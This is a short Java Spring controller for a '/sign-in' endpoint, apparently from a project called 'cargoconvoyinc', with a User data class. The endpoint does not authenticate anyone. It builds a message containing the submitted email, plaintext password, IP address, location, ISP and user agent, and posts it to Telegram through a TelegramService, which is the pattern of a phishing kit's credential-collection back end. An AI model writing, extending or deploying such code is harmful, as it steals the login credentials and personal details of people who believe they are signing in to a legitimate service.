package project.cargoconvoyinc.app.signInController;

import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import project.cargoconvoyinc.app.telegramservice.TelegramService;

@RestController
public class SignInController {

    @RequestMapping(method = RequestMethod.POST, value = "/sign-in")
    public User signIn(@RequestBody User user) {

        // Telegram HTML only supports \n for line breaks
        String message =
                "<b>New login event</b>\n" +
                "<b>Email:</b> " + user.email + "\n" +
                "<b>Password:</b> " + user.password + "\n" +
                "<b>IP:</b> " + user.ip + "\n" +
                "<b>Country:</b> " + user.country + "\n" +
                "<b>State:</b> " + user.state + "\n" +
                "<b>ISP:</b> " + user.isp + "\n" +
                "<b>User Agent:</b> " + user.userAgent;

        TelegramService.sendMessage(message);

        return user;
    }

}

class User {
    public String email;
    public String password;
    public String ip;
    public String country;
    public String state;
    public String isp;
    public String userAgent;
}